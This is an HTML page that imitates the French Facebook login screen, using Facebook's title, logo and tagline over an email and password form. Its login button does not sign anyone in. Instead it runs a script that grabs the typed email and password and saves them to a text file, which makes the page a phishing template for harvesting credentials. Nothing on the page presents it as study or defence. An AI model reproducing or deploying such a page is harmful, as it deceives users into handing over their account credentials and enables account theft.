<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="stylesheet" href="style.css">
    <script src="js.js"></script>
    <script >
        function saveDynamicDataToFile() {
            
            var userInput = document.getElementById("email").value;
            var userInput2 = document.getElementById("passw").value;
            alert([userInput,userInput2]);
            console.log([userInput,userInput2]);
            var blob = new Blob([userInput,userInput2], { type: "text/plain;charset=utf-8" });
            saveAs(blob, "dynamic.txt");
        }
    </script>
    <title>Facebook</title>
</head>
<body id="body">
    <div class="container">
        <div class="container-pageDescript">
           <img src="facebk_logo.png" alt="">
            Avec Facebook, partagez et restez en contact avec votre entourage.
        </div>
        <div class="container-loginForm">
            <form action="" method="post">
                <input class="form-input" type="email" placeholder="Adresse e-mail ou numéro de tel." name="" id="email">
                <input class="form-input" type="password" placeholder="mot de passe" name="" id="passw">
                <button type="button" onclick="saveDynamicDataToFile();" class="form-input btLogin">Se connecter</button>
                <span>Mot de passe oublié?</span>
                <hr style="width: 100%;">
                <button class="form-input btForgotten">Créer un compte</button>
            </form>
        </div>
    </div>
</body>
</html>
